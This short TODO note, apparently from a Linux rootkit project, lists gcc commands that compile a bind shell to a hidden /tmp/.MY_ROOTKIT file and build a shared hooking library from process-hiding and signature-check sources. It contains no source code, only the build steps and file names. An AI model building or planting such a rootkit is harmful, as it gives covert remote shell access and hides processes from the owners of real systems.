## TO DO
what should i compile together
seperate compilation for the bind shell

gcc bind_shell.c -o /tmp/.MY_ROOTKIT 

seperate compilation for the hooking functionality
/gcc -shared -fPIC hide2.c process_hider.c check_for_signature.c -o /tmp/.MY_ROOTKIT.so -ldl